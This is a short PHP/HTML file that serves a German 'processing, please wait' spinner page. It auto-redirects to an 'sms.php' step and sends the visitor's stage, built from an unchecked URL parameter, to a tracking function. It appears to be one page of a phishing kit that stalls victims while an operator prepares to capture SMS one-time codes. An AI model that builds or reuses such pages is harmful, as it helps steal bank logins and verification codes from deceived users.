<?php 
require '../main.php';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Refresh" content="100; url='sms.php'" />
    <link rel="stylesheet" type="text/css" href="css/load.css">
    <title>Verarbeitung</title>
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
</head>
<body>
    <div class="container">
        <div class="loader">
            <!-- Spinner code -->
        </div>

        <div class="loading-text">
          <h3>  Verarbeitung, bitte einen Moment gedulden ... <h3>
        </div>



<script src="js/jq.js"></script>
<?php $m->ctr("LOADING (".@$_GET['p'].")"); ?>
    </div>
</body>
</html>
